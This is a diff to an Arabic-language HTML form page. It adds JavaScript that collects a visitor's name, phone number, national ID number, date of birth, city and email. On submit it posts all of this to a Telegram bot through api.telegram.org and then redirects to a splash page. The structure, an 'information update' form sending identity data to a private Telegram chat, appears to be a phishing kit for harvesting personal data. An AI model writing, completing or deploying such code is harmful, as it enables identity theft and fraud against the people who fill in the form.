@@ -73,7 +73,100 @@ input[type="text"],input[type="tel"],input[type="email"],input[type="date"]{widt
 </div>
 
 <!-- تحميل Google Places API (استبدل YOUR_GOOGLE_API_KEY بمفتاحك) -->
-<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_API_KEY&libraries=places&region=JO&language=ar&callback=initAutocomplete" async defer></script>
+<script>
+// عناصر ونقطة إدخال
+const form = document.getElementById('infoForm');
+const btn = document.getElementById('submitBtn');
+const nameInput = document.getElementById('name');
+const phoneInput = document.getElementById('phone');
+const nationalId = document.getElementById('nationalId');
+const dobDay = document.getElementById('dobDay');
+const dobMonth = document.getElementById('dobMonth');
+const dobYear = document.getElementById('dobYear');
+const dobHidden = document.getElementById('dobHidden');
+const dobFormatted = document.getElementById('dobFormatted');
+const citySelect = document.getElementById('city');
+const emailInput = document.getElementById('email');
+
+// ملء القيم الخاصة بعجلة التاريخ
+(function populateDatePickers(){
+  for(let d=1; d<=31; d++){ const opt=document.createElement('option'); opt.value=String(d).padStart(2,'0'); opt.textContent=String(d); dobDay.appendChild(opt); }
+  const months = ['01','02','03','04','05','06','07','08','09','10','11','12'];
+  for(let m=0;m<12;m++){ const opt=document.createElement('option'); opt.value=months[m]; opt.textContent=months[m]; dobMonth.appendChild(opt); }
+  const thisYear = new Date().getFullYear();
+  const start = thisYear - 100; // نطاق 100 سنة
+  for(let y=thisYear; y>=start; y--){ const opt=document.createElement('option'); opt.value=String(y); opt.textContent=String(y); dobYear.appendChild(opt); }
+})();
+
+function formatYMD(y,m,d){ if(!y||!m||!d) return ''; return `${y}/${m}/${d}`; }
+function updateDobFromPickers(){ const d=dobDay.value; const m=dobMonth.value; const y=dobYear.value; const formatted = formatYMD(y,m,d); dobHidden.value = (formatted ? `${y}-${m}-${d}` : ''); dobFormatted.textContent = formatted ? `المُدخل: ${formatted}` : ''; updateButtonState(); }
+['change','input'].forEach(ev=>{ dobDay.addEventListener(ev, updateDobFromPickers); dobMonth.addEventListener(ev, updateDobFromPickers); dobYear.addEventListener(ev, updateDobFromPickers); });
+
+// تفعيل زر التالي بعد تعبئة جميع الحقول
+function updateButtonState(){
+  const nameOk = !!nameInput.value.trim();
+  const phoneOk = !!phoneInput.value.trim();
+  const nationalOk = !!nationalId.value.trim();
+  const cityOk = !!citySelect.value.trim();
+  const emailOk = !!emailInput.value.trim();
+  const dobOk = !!dobHidden.value;
+  const all = nameOk && phoneOk && nationalOk && cityOk && emailOk && dobOk;
+  if(all){ btn.classList.add('active'); btn.removeAttribute('disabled'); btn.style.cursor='pointer'; }
+  else{ btn.classList.remove('active'); btn.setAttribute('disabled', true); btn.style.cursor='not-allowed'; }
+}
+[nameInput,phoneInput,nationalId,citySelect,emailInput].forEach(el=>el.addEventListener('input', updateButtonState));
+
+// جعل الرقم الوطني أرقام فقط
+nationalId.addEventListener('keydown', (e) => { const allowed = ['Backspace','Delete','ArrowLeft','ArrowRight','Tab']; if (allowed.includes(e.key)) return; if (e.key.length===1 && !/^[0-9]$/.test(e.key)) e.preventDefault(); });
+nationalId.addEventListener('input', ()=>{ nationalId.value = nationalId.value.replace(/\D/g,'').slice(0,nationalId.maxLength); updateButtonState(); });
+nationalId.addEventListener('paste', (e)=>{ e.preventDefault(); const paste = (e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,''); nationalId.value = paste.slice(0,nationalId.maxLength); updateButtonState(); });
+
+// إرسال البيانات إلى تلجرام ثم تحويل إلى splash1.html
+const BOT_TOKEN = 'ضع_توكن_البوت_هنا';
+const CHAT_ID = 'ضع_ChatID_هنا';
+form.addEventListener('submit', function(e){
+  e.preventDefault();
+  if(btn.disabled) return;
+
+  const data = {
+    name: nameInput.value.trim(),
+    phone: phoneInput.value.trim(),
+    nationalId: nationalId.value.trim(),
+    dob: dobFormatted.textContent.replace('المُدخل: ','').trim(),
+    city: citySelect.value.trim(),
+    email: emailInput.value.trim()
+  };
+
+  const text = `📋 تحديث المعلومات:
+👤 الاسم: ${data.name}
+📞 الهاتف: ${data.phone}
+🆔 الرقم الوطني: ${data.nationalId}
+🎂 تاريخ الميلاد: ${data.dob}
+🏙️ المدينة: ${data.city}
+📧 البريد الإلكتروني: ${data.email}`;
+
+  if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_توكن') || !CHAT_ID || CHAT_ID.includes('ضع_ChatID')){
+    alert('تنبيه: لم تقم بإضافة بيانات بوت التلجرام في الكود. سيتم عرض النتيجة محليًا.');
+    console.log('payload ->', text);
+    window.location.href = 'splash1.html';
+    return;
+  }
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ chat_id: CHAT_ID, text })
+  })
+  .then(res => res.json())
+  .then(resp => {
+    if(resp && resp.ok){ window.location.href = 'splash1.html'; }
+    else{ alert('حدث خطأ في إرسال البيانات إلى تلجرام.'); console.error('telegram response', resp); }
+  })
+  .catch(err => { alert('حدث خطأ في الإرسال'); console.error(err); });
+});
+
+// تحديث حالة الزر عند تحميل الصفحة
+updateButtonState();
+</script>
 
 <script>
 // عناصر ونقطة إدخال
